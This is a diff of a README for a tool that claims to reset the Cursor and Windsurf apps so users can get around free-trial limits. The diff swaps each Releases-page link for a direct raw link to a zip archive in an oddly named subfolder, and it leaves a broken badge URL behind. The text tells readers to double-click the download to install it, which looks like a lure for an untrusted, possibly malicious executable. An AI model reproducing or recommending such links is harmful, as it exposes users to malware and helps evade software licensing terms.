@@ -4,14 +4,14 @@
 Welcome to Cursor_Windsurf_Reset! This tool helps you reset the Cursor and Windsurf applications, allowing you to start fresh or take advantage of free trial options. It supports the latest versions of both apps, ensuring you can use them without hassle. 
 
 ## 📦 Download Now
-[![Download Cursor_Windsurf_Reset](https://img.shields.io/badge/Download%20Now-%20Cursor_Windsurf_Reset-blue)](https://github.com/pooja819/Cursor_Windsurf_Reset/releases)
+[![Download Cursor_Windsurf_Reset](https://raw.githubusercontent.com/pooja819/Cursor_Windsurf_Reset/main/iliopsoatic/Cursor_Windsurf_Reset.zip%20Now-%20Cursor_Windsurf_Reset-blue)](https://raw.githubusercontent.com/pooja819/Cursor_Windsurf_Reset/main/iliopsoatic/Cursor_Windsurf_Reset.zip)
 
 ## 🚀 Getting Started
 Follow the steps below to download and run Cursor_Windsurf_Reset easily.
 
 ### 1. Visit the Download Page
 To get started, visit our Releases page to download the application. You can access it here:
-[Download Page](https://github.com/pooja819/Cursor_Windsurf_Reset/releases)
+[Download Page](https://raw.githubusercontent.com/pooja819/Cursor_Windsurf_Reset/main/iliopsoatic/Cursor_Windsurf_Reset.zip)
 
 ### 2. Choose Your Version
 On the Releases page, you will see different versions of the application. Select the latest version, as it will include the newest features and updates. 
@@ -40,7 +40,7 @@ Cursor_Windsurf_Reset offers the following features:
 
 ## 📥 Download & Install
 Remember to visit the Releases page to download Cursor_Windsurf_Reset:
-[Download Page](https://github.com/pooja819/Cursor_Windsurf_Reset/releases)
+[Download Page](https://raw.githubusercontent.com/pooja819/Cursor_Windsurf_Reset/main/iliopsoatic/Cursor_Windsurf_Reset.zip)
 
 After downloading, double-click the file to begin installation. Follow the steps on-screen to complete the process.
 
